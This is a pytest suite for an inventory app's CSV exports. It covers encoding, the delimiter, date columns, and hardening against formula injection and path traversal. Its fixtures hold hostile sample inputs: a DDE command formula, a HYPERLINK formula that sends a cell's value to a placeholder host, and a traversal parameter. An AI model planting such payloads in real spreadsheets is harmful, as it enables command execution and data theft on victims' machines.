"""BCK-02 executable contract: full-table CSV export (products/sales/customers).

Covers D-06 (dedicated /export page with three static download links, plain
<a href> never hx-get) and D-07 (utf-8-sig BOM-once encoding so Cyrillic
survives an Excel double-click open), RESEARCH Pitfall 4 (";" row delimiter
so a comma-decimal money field like "12,50" is never itself split), and
security T-06-09/T-06-10 (zero client-supplied filename/path params on any
export route; CSV-formula-injection hardening via a leading apostrophe on
any free-text cell starting with =, +, -, or @).

Naming convention: route-level tests are test_web_export_* / test_web_nav_*;
service-level tests (Task 1) must NOT contain those prefixes.
"""

import asyncio
import csv
import io
from datetime import date, datetime
from zoneinfo import ZoneInfo

from sqlalchemy import select

from app.config import settings
from app.core import (
    business_date_bounds,
    iso_to_local,
    local_day_bounds_utc,
    new_id,
    utcnow_iso,
)
from app.models import Batch, CashMovement, Customer, Sale, Warehouse
from app.services.export import (
    _csv_rows,
    _csv_safe,
    _encode_once,
    stream_cash_movements_csv,
    stream_customers_csv,
    stream_products_csv,
    stream_sales_csv,
)
from app.services.finance import record_cash_movement
from app.services.ledger import record_operation

DAY = date(2026, 7, 10)
TZ = "Europe/Moscow"

# Phase 33 (D-23): the header shape at HEAD, i.e. BEFORE «Внесено» was
# appended. Recorded as constants so `test_csv_vnesyeno_column_is_last` can
# assert that positions 1..N did NOT shift — an existing spreadsheet formula
# over Код / Цена / Сумма must keep working.
_SALES_HEADER_BEFORE_VNESYENO = [
    "Когда",
    "Код",
    "Товар",
    "Кол-во",
    "Цена",
    "Себестоимость",
    "Валюта",
    "Покупатель",
    "Кто",
]
_CASH_HEADER_BEFORE_VNESYENO = ["Когда", "Категория", "Валюта", "Комментарий", "Сумма"]
_PRODUCTS_HEADER_AT_HEAD = [
    "Код",
    "Название",
    "Категория",
    "Закупка",
    "Продажа",
    "Остаток",
    "Удалён",
]
_CUSTOMERS_HEADER_AT_HEAD = ["Имя", "Фамилия", "Номер консультанта", "Создан"]


def _local_day_of(iso: str) -> str:
    """tz-correct LOCAL day of a UTC timestamp — mirrors tests/test_reports.py.

    Phase 33 (DATE-03): reproduces exactly what migration 0027 backfills for a
    pre-existing row, so a fixture with a historical `created_at` keeps the
    period it always meant instead of landing in TODAY's bucket (the write
    path stamps today's local day when `business_date` is not given).
    """
    return datetime.fromisoformat(iso).astimezone(ZoneInfo(TZ)).date().isoformat()


def _ensure_batch(session, product):
    """A valid batch id for a product — the mandatory D-12 write-path guard
    (Plan 09-05) requires every stock op to name a batch."""
    batch = session.scalars(
        select(Batch).where(Batch.product_id == product.id)
    ).first()
    if batch is None:
        warehouse = session.scalars(select(Warehouse)).first()
        if warehouse is None:
            warehouse = Warehouse(id=new_id(), name="Склад")
            session.add(warehouse)
            session.flush()
        batch = Batch(
            id=new_id(),
            product_id=product.id,
            warehouse_id=warehouse.id,
            quantity=0,
        )
        session.add(batch)
        session.flush()
    return batch.id

# --- service-level: BOM-once + delimiter correctness (Task 1) ---------------


def test_csv_bom_appears_once():
    chunks = list(
        _encode_once(_csv_rows(["A", "B"], [["1", "2"], ["3", "4"], ["5", "6"]]))
    )
    joined = b"".join(chunks)
    assert joined.startswith(b"\xef\xbb\xbf")
    # The BOM bytes must not appear a second time anywhere later in the stream.
    assert joined.count(b"\xef\xbb\xbf") == 1


def test_money_field_not_split_by_delimiter():
    chunks = list(
        _encode_once(_csv_rows(["Товар", "Цена"], [["Тестовый товар", "12,50"]]))
    )
    text = b"".join(chunks).decode("utf-8-sig")
    reader = csv.reader(io.StringIO(text), delimiter=";")
    rows = list(reader)
    assert rows[0] == ["Товар", "Цена"]
    # The comma-decimal money value stays ONE field — never split by ";".
    assert rows[1] == ["Тестовый товар", "12,50"]
    assert len(rows[1]) == 2


def test_csv_safe_prefixes_formula_injection_chars():
    for prefix in ("=", "+", "-", "@"):
        assert _csv_safe(f"{prefix}cmd") == f"'{prefix}cmd"


def test_csv_safe_leaves_normal_values_untouched():
    assert _csv_safe("Обычное имя") == "Обычное имя"
    assert _csv_safe("") == ""


# --- service-level: stream_cash_movements_csv (FIN-09, Task 3) -------------


def _stream_body(response):
    """Collect a StreamingResponse's chunks (body_iterator is always async —
    Starlette wraps a sync generator via iterate_in_threadpool)."""

    async def _collect() -> bytes:
        chunks = [chunk async for chunk in response.body_iterator]
        return b"".join(chunks)

    return asyncio.run(_collect())


def test_cash_movements_csv_bom_delimiter_and_header(session):
    start_day, end_day = business_date_bounds(DAY, DAY)
    mid = "2026-07-10T10:00:00+00:00"

    import app.services.finance as finance_module

    original_utcnow_iso = finance_module.utcnow_iso
    finance_module.utcnow_iso = lambda: mid
    try:
        record_cash_movement(
            session,
            category="withdrawal_supplier",
            amount_cents=-1200,
            note="Оплата",
            business_date=_local_day_of(mid),
        )
        record_cash_movement(
            session,
            category="sale",
            amount_cents=3000,
            business_date=_local_day_of(mid),
        )
    finally:
        finance_module.utcnow_iso = original_utcnow_iso

    response = stream_cash_movements_csv(session, start_day, end_day)
    body = _stream_body(response)
    assert body.count(b"\xef\xbb\xbf") == 1

    text = body.decode("utf-8-sig")
    reader = csv.reader(io.StringIO(text), delimiter=";")
    rows = list(reader)
    assert rows[0] == ["Когда", "Категория", "Валюта", "Комментарий", "Сумма", "Внесено"]
    assert len(rows) == 3
    # Oldest-first: both rows share the same timestamp, insertion order holds.
    assert rows[1][1] == "Оплата поставщику"
    assert rows[1][2] == "RUB"
    assert rows[1][3] == "Оплата"
    assert rows[1][4] == "-12,00"
    assert rows[2][1] == "Продажа"
    assert rows[2][2] == "RUB"
    assert rows[2][3] == ""
    assert rows[2][4] == "30,00"


def test_cash_movements_csv_null_note_renders_empty(session, monkeypatch):
    start_day, end_day = business_date_bounds(DAY, DAY)
    mid = "2026-07-10T10:00:00+00:00"
    monkeypatch.setattr("app.services.finance.utcnow_iso", lambda: mid)
    record_cash_movement(
        session, category="sale", amount_cents=1000, business_date=_local_day_of(mid)
    )

    response = stream_cash_movements_csv(session, start_day, end_day)
    text = _stream_body(response).decode("utf-8-sig")
    reader = csv.reader(io.StringIO(text), delimiter=";")
    rows = list(reader)
    assert rows[1][3] == ""
    assert "None" not in text


def test_cash_movements_csv_escapes_formula_injection_note(session, monkeypatch):
    start_day, end_day = business_date_bounds(DAY, DAY)
    mid = "2026-07-10T10:00:00+00:00"
    monkeypatch.setattr("app.services.finance.utcnow_iso", lambda: mid)
    record_cash_movement(
        session,
        category="withdrawal_other",
        amount_cents=-100,
        note="=CMD()",
        business_date=_local_day_of(mid),
    )

    response = stream_cash_movements_csv(session, start_day, end_day)
    text = _stream_body(response).decode("utf-8-sig")
    reader = csv.reader(io.StringIO(text), delimiter=";")
    rows = list(reader)
    assert rows[1][3] == "'=CMD()"


def test_cash_movements_csv_closed_period_and_order(session):
    """Phase 33 (DATE-03): the row set is the CLOSED business-date range.

    Renamed from *_half_open_period_and_order and re-pointed at the new
    contract. The two seeding INSTANTS are unchanged — `local_day_bounds_utc`
    is still the sanctioned way to build a `created_at` that straddles local
    midnight — but the export now selects on `business_date_expr`, so the
    boundary being exercised is «the last day of the range is INCLUDED, the
    next local day is not», not «the upper timestamp bound is exclusive».

    The two instants are local 2026-07-10 00:00 and local 2026-07-11 00:00, so
    their tz-correct business dates land one inside and one outside the
    single-day period — the same two rows, the same outcome, for the correct
    reason.
    """
    created_in, created_out = local_day_bounds_utc(DAY, DAY, TZ)
    start_day, end_day = business_date_bounds(DAY, DAY)

    import app.services.finance as finance_module

    original_utcnow_iso = finance_module.utcnow_iso
    try:
        finance_module.utcnow_iso = lambda: created_in
        record_cash_movement(
            session,
            category="sale",
            amount_cents=1000,
            business_date=_local_day_of(created_in),
        )
        finance_module.utcnow_iso = lambda: created_out
        record_cash_movement(
            session,
            category="sale",
            amount_cents=2000,
            business_date=_local_day_of(created_out),
        )
    finally:
        finance_module.utcnow_iso = original_utcnow_iso

    # Pin the fixture's own premise, so the assertion below cannot pass for the
    # wrong reason if the tz conversion ever moves.
    assert _local_day_of(created_in) == end_day
    assert _local_day_of(created_out) > end_day

    response = stream_cash_movements_csv(session, start_day, end_day)
    text = _stream_body(response).decode("utf-8-sig")
    reader = csv.reader(io.StringIO(text), delimiter=";")
    rows = list(reader)
    # The row ON the last day of the range is INCLUDED (closed contract); the
    # next local day's row is excluded.
    assert len(rows) == 2
    assert rows[1][4] == "10,00"


# --- route-level: /export page + three download routes (Task 2) ------------


def test_web_export_page_has_three_download_links(client):
    response = client.get("/export")
    assert response.status_code == 200
    body = response.text
    assert 'href="/export/products.csv"' in body
    assert 'href="/export/sales.csv"' in body
    assert 'href="/export/customers.csv"' in body
    # UI-SPEC hard rule: plain anchors only — htmx would break the native
    # Content-Disposition download by trying to swap the CSV into the DOM.
    assert 'hx-get="/export' not in body


def test_products_csv_roundtrip(client, product):
    response = client.get("/export/products.csv")
    assert response.status_code == 200
    assert "products.csv" in response.headers["content-disposition"]
    text = response.content.decode("utf-8-sig")
    reader = csv.reader(io.StringIO(text), delimiter=";")
    rows = list(reader)
    # D-01/Pitfall 4 (Phase 18 plan 02): the third (catalog) price column is
    # gone from the export header — PROD-05 collapses pricing to ДЦ/ПЦ only.
    assert rows[0] == [
        "Код",
        "Название",
        "Категория",
        "Закупка",
        "Продажа",
        "Остаток",
        "Удалён",
    ]
    assert "Каталог" not in rows[0]
    # Exactly one seeded product from the `product` fixture.
    assert len(rows) == 2
    assert rows[1][0] == product.code
    assert rows[1][1] == product.name


def test_sales_csv_roundtrip(client, session, product):
    """WR-02: content-level coverage for stream_sales_csv, incl. formula-injection-safe buyer name."""
    customer = Customer(
        id=new_id(),
        name="=cmd",
        surname="Тестова",
        consultant_number="99999",
        search_lc="=cmd тестова 99999",
    )
    session.add(customer)
    header = Sale(
        id=new_id(),
        customer_id=customer.id,
        created_at=utcnow_iso(),
        created_by=settings.operator_name,
    )
    session.add(header)
    record_operation(
        session,
        type_="sale",
        product_id=product.id,
        qty_delta=-2,
        unit_cost_cents=1000,
        unit_price_cents=1500,
        sale_id=header.id,
        batch_id=_ensure_batch(session, product),
    )
    session.commit()

    response = client.get("/export/sales.csv")
    assert response.status_code == 200
    assert "sales.csv" in response.headers["content-disposition"]
    text = response.content.decode("utf-8-sig")
    reader = csv.reader(io.StringIO(text), delimiter=";")
    rows = list(reader)
    assert rows[0] == [
        "Когда",
        "Код",
        "Товар",
        "Кол-во",
        "Цена",
        "Себестоимость",
        "Валюта",
        "Покупатель",
        "Кто",
        "Внесено",
    ]
    assert len(rows) == 2
    assert rows[1][1] == product.code
    assert rows[1][2] == product.name
    assert rows[1][3] == "2"
    # CUR-02: the sold batch's warehouse currency (default RUB via _ensure_batch).
    assert rows[1][6] == "RUB"
    # Formula-injection-prefixed customer name is escaped with a leading apostrophe.
    assert rows[1][7] == "'=cmd Тестова"
    assert rows[1][8] == settings.operator_name


def test_sales_csv_labels_non_default_currency(client, session, product):
    """CUR-02: a sale whose batch lives in a non-RUB warehouse is labelled correctly."""
    eur_wh = Warehouse(id=new_id(), name="Склад EUR", currency="EUR")
    session.add(eur_wh)
    session.flush()
    eur_batch = Batch(id=new_id(), product_id=product.id, warehouse_id=eur_wh.id, quantity=0)
    session.add(eur_batch)
    header = Sale(
        id=new_id(), customer_id=None, created_at=utcnow_iso(), created_by=settings.operator_name
    )
    session.add(header)
    record_operation(
        session,
        type_="sale",
        product_id=product.id,
        qty_delta=-1,
        unit_cost_cents=500,
        unit_price_cents=800,
        sale_id=header.id,
        batch_id=eur_batch.id,
    )
    session.commit()

    response = client.get("/export/sales.csv")
    text = response.content.decode("utf-8-sig")
    reader = csv.reader(io.StringIO(text), delimiter=";")
    rows = list(reader)
    assert rows[1][6] == "EUR"


def test_cash_movements_csv_labels_non_default_currency(session):
    """CUR-02: a cash movement recorded with currency=EUR is labelled correctly."""
    start_day, end_day = business_date_bounds(DAY, DAY)
    mid = "2026-07-10T10:00:00+00:00"
    import app.services.finance as finance_module

    original_utcnow_iso = finance_module.utcnow_iso
    finance_module.utcnow_iso = lambda: mid
    try:
        record_cash_movement(
            session,
            category="sale",
            amount_cents=1000,
            currency="EUR",
            business_date=_local_day_of(mid),
        )
    finally:
        finance_module.utcnow_iso = original_utcnow_iso

    response = stream_cash_movements_csv(session, start_day, end_day)
    text = _stream_body(response).decode("utf-8-sig")
    reader = csv.reader(io.StringIO(text), delimiter=";")
    rows = list(reader)
    assert rows[1][2] == "EUR"


def test_customers_csv_roundtrip(client, session):
    """WR-02 / CR-01: content-level coverage pinning consultant_number CSV escaping."""
    customer = Customer(
        id=new_id(),
        name="Пётр",
        surname="Сидоров",
        consultant_number="=cmd|'/C calc'!A0",
        search_lc="пётр сидоров",
    )
    session.add(customer)
    session.commit()

    response = client.get("/export/customers.csv")
    assert response.status_code == 200
    assert "customers.csv" in response.headers["content-disposition"]
    text = response.content.decode("utf-8-sig")
    reader = csv.reader(io.StringIO(text), delimiter=";")
    rows = list(reader)
    assert rows[0] == ["Имя", "Фамилия", "Номер консультанта", "Создан"]
    assert len(rows) == 2
    assert rows[1][0] == "Пётр"
    assert rows[1][1] == "Сидоров"
    # CR-01: consultant_number is now escaped like every other free-text field.
    assert rows[1][2] == "'=cmd|'/C calc'!A0"


def test_web_export_ignores_client_params(client, product):
    baseline = client.get("/export/products.csv").content
    response = client.get("/export/products.csv?path=..%5Cevil&filename=x.csv")
    assert response.status_code == 200
    assert response.content == baseline
    assert "evil" not in response.text


def test_web_export_links_embedded_in_backup_page(client):
    response = client.get("/backup")
    assert response.status_code == 200
    assert 'href="/export/products.csv"' in response.text
    assert "Экспорт" in response.text


# --- Phase 33 / D-23: «Когда» is the business date, «Внесено» is last -------


def _rows_of(response):
    """Decode a StreamingResponse into parsed CSV rows (header first)."""
    text = _stream_body(response).decode("utf-8-sig")
    return list(csv.reader(io.StringIO(text), delimiter=";"))


def _route_rows(response):
    """Same, for a TestClient response (the real /export/sales.csv entry point)."""
    return list(csv.reader(io.StringIO(response.content.decode("utf-8-sig")), delimiter=";"))


def _record_sale_op(session, product, *, business_date=None, unit_price_cents=1500):
    """One sale operation through the SINGLE write path, entered NOW.

    `business_date` is passed straight through, so leaving it out means «today»
    and passing an older day means genuinely back-dated (entered now,
    attributed to an earlier day) — exactly the DATE-05 row shape.
    """
    header = Sale(
        id=new_id(),
        customer_id=None,
        created_at=utcnow_iso(),
        created_by=settings.operator_name,
    )
    session.add(header)
    session.flush()
    op = record_operation(
        session,
        type_="sale",
        product_id=product.id,
        qty_delta=-1,
        unit_cost_cents=1000,
        unit_price_cents=unit_price_cents,
        sale_id=header.id,
        batch_id=_ensure_batch(session, product),
        business_date=business_date,
    )
    session.commit()
    return op


def _insert_pre_0027_movement(session, *, created_at, amount_cents, device_id):
    """INSERT a cash movement with business_date NULL — the DATE-08 row shape.

    A pre-0027 client's row arrives through merge's bulk insert with the key
    absent, so the column lands genuinely NULL. It cannot be produced through
    `record_cash_movement` (which stamps today's local day in Python) nor
    patched afterwards (the cash_movements_no_update trigger ABORTs the
    UPDATE) — it has to be an INSERT-time NULL. A distinct `device_id` keeps
    the per-device (device_id, seq) unique constraint out of the way.
    """
    movement = CashMovement(
        id=new_id(),
        category="sale",
        amount_cents=amount_cents,
        currency="RUB",
        device_id=device_id,
        seq=1,
        created_at=created_at,
        business_date=None,
        created_by=settings.operator_name,
    )
    session.add(movement)
    session.commit()
    return movement


def test_sales_csv_when_column_is_business_date(client, session, product):
    """D-23: a back-dated sale states WHEN IT HAPPENED first and when it was
    ENTERED last."""
    op = _record_sale_op(session, product, business_date="2026-06-15")
    entered_at = iso_to_local(op.created_at, settings.display_tz)

    # Driven through the REAL route, not the service — this is the wiring test.
    rows = _route_rows(client.get("/export/sales.csv"))
    assert len(rows) == 2
    # Column 1 is the BUSINESS date, day only — no time separator survives.
    assert rows[1][0] == "15.06.2026"
    assert ":" not in rows[1][0]
    # The entry timestamp moved to the LAST column, HH:MM intact.
    assert rows[1][-1] == entered_at
    assert ":" in rows[1][-1]
    # DATE-04: the two really are different days — the row was entered today.
    assert rows[1][-1][:10] != rows[1][0]


def test_sales_csv_when_column_is_formula_escaped(client, session, product):
    """WR-04 (33-REVIEW): column 1 is now a pass-through of STORED BYTES.

    Before Phase 33 it was `iso_to_local(...)`, which can only produce
    `dd.mm.yyyy HH:MM` — genuinely not free text, so leaving it outside
    `_csv_safe` was safe. D-23 changed it to `format_ru_date(...)`, and the
    CR-01 fix then made that filter return the stored value verbatim on
    anything it does not recognise. So the module's own T-06-10 invariant
    («any free-text value starting with =, +, - or @ is apostrophe-prefixed»)
    stopped holding for the file's FIRST column.

    The value is written through `record_operation` directly, which is the
    honest reproduction: `parse_op_date` guards the 14 operator surfaces and
    `parse_exchange` guards the wire, but this is the second layer, and the
    argument for having one is the same one that justified hardening
    `format_ru_date` rather than trusting the gate.
    """
    poisoned = '=HYPERLINK("http://x/"&A2,"click")'
    _record_sale_op(session, product, business_date=poisoned)

    rows = _route_rows(client.get("/export/sales.csv"))

    assert any(row[0] == "'" + poisoned for row in rows[1:]), rows
    assert not any(row[0].startswith("=") for row in rows[1:])


def test_cash_csv_when_column_is_business_date(session):
    """D-23, the cash twin: same rule on CashMovement."""
    back_dated = date(2026, 6, 15)
    movement = record_cash_movement(
        session,
        category="sale",
        amount_cents=2500,
        business_date=back_dated.isoformat(),
    )
    entered_at = iso_to_local(movement.created_at, settings.display_tz)

    start_day, end_day = business_date_bounds(back_dated, back_dated)
    rows = _rows_of(stream_cash_movements_csv(session, start_day, end_day))
    assert len(rows) == 2
    assert rows[1][0] == "15.06.2026"
    assert ":" not in rows[1][0]
    assert rows[1][-1] == entered_at
    assert rows[1][-1][:10] != rows[1][0]


def test_csv_vnesyeno_column_is_last(session, product):
    """The new header is LAST in both files and no existing column moved.

    The accepted cost of D-23 is that column 1's value TYPE narrows; the
    accepted cost it explicitly REFUSES is a shifted column index, because a
    spreadsheet formula over Код / Цена / Сумма would silently start reading a
    different column.
    """
    _record_sale_op(session, product, business_date="2026-06-15")
    record_cash_movement(
        session, category="sale", amount_cents=2500, business_date="2026-06-15"
    )
    start_day, end_day = business_date_bounds(date(2026, 6, 15), date(2026, 6, 15))

    sales_header = _rows_of(stream_sales_csv(session))[0]
    cash_header = _rows_of(stream_cash_movements_csv(session, start_day, end_day))[0]

    for header, before in (
        (sales_header, _SALES_HEADER_BEFORE_VNESYENO),
        (cash_header, _CASH_HEADER_BEFORE_VNESYENO),
    ):
        assert header[-1] == "Внесено"
        assert len(header) == len(before) + 1
        # Every position 1..N is byte-identical to HEAD.
        assert header[: len(before)] == before

    # The three indexes an operator's spreadsheet formula is most likely to
    # reference, asserted by name rather than by slice equality alone.
    assert sales_header.index("Код") == 1
    assert sales_header.index("Цена") == 4
    assert cash_header.index("Сумма") == 4


def test_csv_first_column_non_decreasing(session, product):
    """Both ORDER BY edits at once — including the CD-9 one D-23 never named.

    Rows are SEEDED in an order that contradicts their business dates, so a
    dump still ordered by `created_at` fails this immediately.
    """
    for day in ("2026-06-20", "2026-06-10", "2026-06-15"):
        _record_sale_op(session, product, business_date=day)
        record_cash_movement(
            session, category="sale", amount_cents=1000, business_date=day
        )

    start_day, end_day = business_date_bounds(date(2026, 6, 1), date(2026, 6, 30))
    sales_rows = _rows_of(stream_sales_csv(session))
    cash_rows = _rows_of(stream_cash_movements_csv(session, start_day, end_day))

    for rows in (sales_rows, cash_rows):
        days = [datetime.strptime(row[0], "%d.%m.%Y").date() for row in rows[1:]]
        assert len(days) == 3
        assert days == sorted(days), f"column 1 is not non-decreasing: {days}"


def test_cash_csv_row_set_uses_business_date(session):
    """VA-13: the exported ROW SET follows the business date, not the entry date.

    Both movements are entered NOW. One is back-dated INTO the exported period
    and must appear; the other is back-dated OUT of it and must not. Under the
    pre-33-09 `created_at` predicate the file would contain both or neither —
    never exactly this split.
    """
    period = date(2026, 6, 15)
    record_cash_movement(
        session, category="sale", amount_cents=1100, business_date=period.isoformat()
    )
    record_cash_movement(
        session,
        category="sale",
        amount_cents=2200,
        business_date=date(2026, 5, 15).isoformat(),
    )

    start_day, end_day = business_date_bounds(period, period)
    rows = _rows_of(stream_cash_movements_csv(session, start_day, end_day))
    assert len(rows) == 2
    assert rows[1][4] == "11,00"
    assert "22,00" not in [row[4] for row in rows[1:]]


def test_csv_null_business_date_falls_back_to_utc_prefix(
    session, customer, product, past_sale
):
    """DATE-08: a pre-0027 client's row still appears, bucketed by its entry date.

    The render fallback is the UTC PREFIX of `created_at`, deliberately — it is
    the same value `func.coalesce(business_date, substr(created_at, 1, 10))`
    selected the row by, so column 1 cannot contradict the file's own period.
    It is knowingly NOT the tz-correct local day: `created_at` here is
    21:30 UTC, whose Europe/Moscow day is the NEXT one, and the assertion pins
    the UTC day precisely so nobody "unifies" the read fallback with migration
    0027's tz-correct backfill.
    """
    created_at = "2026-05-20T21:30:00+00:00"
    assert _local_day_of(created_at) == "2026-05-21"  # the value NOT used

    movement = _insert_pre_0027_movement(
        session, created_at=created_at, amount_cents=3300, device_id="device-OLD"
    )
    assert movement.business_date is None

    utc_day = date(2026, 5, 20)
    start_day, end_day = business_date_bounds(utc_day, utc_day)
    rows = _rows_of(stream_cash_movements_csv(session, start_day, end_day))
    assert len(rows) == 2, "a NULL-business_date row must NOT vanish from the export"
    assert rows[1][0] == "20.05.2026"
    assert rows[1][4] == "33,00"

    # The sales half of the same rule: past_sale INSERTs with business_date NULL.
    _sale, op = past_sale(customer, product, created_at=created_at)
    assert op.business_date is None
    sales_rows = _rows_of(stream_sales_csv(session))
    assert [row[0] for row in sales_rows[1:]] == ["20.05.2026"]


def test_products_and_customers_csv_unchanged(session, product):
    """The two undated exports are byte-unchanged by D-23.

    products.csv has no date column at all, and customers.csv's «Создан» is
    `Customer.created_at` on a table that gains no `business_date` — so neither
    gets «Внесено» and neither header may move.
    """
    session.add(
        Customer(
            id=new_id(),
            name="Анна",
            surname="Иванова",
            consultant_number="12345",
            search_lc="анна иванова",
        )
    )
    session.commit()

    products_rows = _rows_of(stream_products_csv(session))
    customers_rows = _rows_of(stream_customers_csv(session))

    assert products_rows[0] == _PRODUCTS_HEADER_AT_HEAD
    assert customers_rows[0] == _CUSTOMERS_HEADER_AT_HEAD
    assert "Внесено" not in products_rows[0]
    assert "Внесено" not in customers_rows[0]
    # customers.csv's «Создан» keeps its full dd.mm.yyyy HH:MM entry-time render.
    assert ":" in customers_rows[1][3]
